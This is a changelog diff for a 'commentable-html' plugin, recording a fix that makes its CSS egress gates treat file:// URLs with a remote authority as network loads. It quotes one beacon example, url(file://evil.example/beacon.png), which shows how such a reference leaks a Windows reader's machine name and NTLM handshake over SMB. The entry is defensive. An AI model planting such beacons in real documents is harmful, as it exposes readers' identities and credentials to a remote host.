@@ -4,6 +4,36 @@ All notable changes to the `commentable-html` plugin are documented here. The fo
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and versions follow
 [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.822.0] - 2026-08-07
+
+### Fixed
+
+- The CSS egress gates now recognize an explicit `file://` AUTHORITY, the same spelling the
+  attribute predicate has called an off-machine load since it gained a `file:` arm. On Windows
+  `file://host/x` is an SMB fetch that leaks the reader's machine name and, depending on
+  configuration, an NTLM handshake, yet `url(file://evil.example/beacon.png)`, the `@import` form
+  beside it, an `image-set()` candidate, a `style=` attribute, an SVG presentation attribute and
+  the nested `iframe srcdoc` scan all read it as a LOCAL reference. So a shareable document
+  carrying one passed `--strict` as self-contained and earned the `commentable-html-validated`
+  stamp while beaconing on open. The recorded reason for leaving those gates narrower was that the
+  zero-network CSP closes the channel, and that holds in OFFLINE mode only - shareable mode
+  requires no CSP at all, so the literal gate was the single layer.
+- The fix is a SHARED arm rather than a second hand-written rule, so the two sides cannot drift
+  apart again: the `file:` authority is built once and read by the attribute predicate and by every
+  CSS reader, parameterized only by what ends a value in the caller's context (nothing for an
+  attribute, a quote / `)` / whitespace / `;{}` for a stylesheet). The separator arithmetic
+  (exactly two separators, or four-or-more), the `localhost` and Windows drive-letter exclusions,
+  the non-empty-authority rule and the two canonicalization arms therefore answer identically in a
+  stylesheet and in an attribute. The local controls stay clean, which is what the sharing buys:
+  `url(file:///C:/x.png)`, `url(file://localhost/x.png)`, `url(file://C:/x.png)` and
+  `url(file://localhost)` are all left untouched, so the widening cannot delete an author's own
+  local reference. The deck gate and the nested `srcdoc` scan inherit the verdict because they read
+  the same assembled patterns.
+- The exporter's CSS strip moved in the same change and is pinned to the validator as TEXT, not
+  merely by verdicts: the runtime's own arm builder is evaluated in a real JS engine and compared
+  character for character for every terminator set its callers use, so a widening can no longer
+  land on one side and make the gate reject a file the exporter just produced.
+
 ## [1.821.0] - 2026-08-07
 
 ### Changed
